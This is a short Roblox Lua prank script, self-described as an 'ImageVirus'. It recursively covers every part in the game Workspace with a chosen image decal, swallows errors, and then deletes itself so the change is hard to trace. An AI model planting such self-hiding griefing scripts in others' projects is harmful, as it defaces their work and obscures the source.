--for mah old 'hacker' friend
textu = script.ImageUrl.Value

function imagevirus(object)
for i = 1,1 do -- lol 8D

if object.className == "Part" or object.className == "TrussPart" or object.className == "WedgePart" then
print'Virus lol'
d1 = Instance.new("Decal")
d2 = Instance.new("Decal")
d3 = Instance.new("Decal")
d4 = Instance.new("Decal")
d5 = Instance.new("Decal")
d6 = Instance.new("Decal")

d1.Parent = object
d2.Parent = object
d3.Parent = object
d4.Parent = object
d5.Parent = object
d6.Parent = object

d1.Face =0
d2.Face =1
d3.Face =2
d4.Face =3
d5.Face =4
d6.Face =5

d1.Texture =textu
d2.Texture =textu
d3.Texture =textu
d4.Texture =textu
d5.Texture =textu
d6.Texture =textu


d1.Name = "ImageVirus"
d2.Name = "ImageVirus"
d3.Name = "ImageVirus"
d4.Name = "ImageVirus"
d5.Name = "ImageVirus"
d6.Name = "ImageVirus"

end
end
end


function c(object)
pcall(function() for i,obj in pairs(object:GetChildren()) do
imagevirus(obj)
c(obj)
end 
end)
end

c(Workspace)
wait(4)
script:Remove()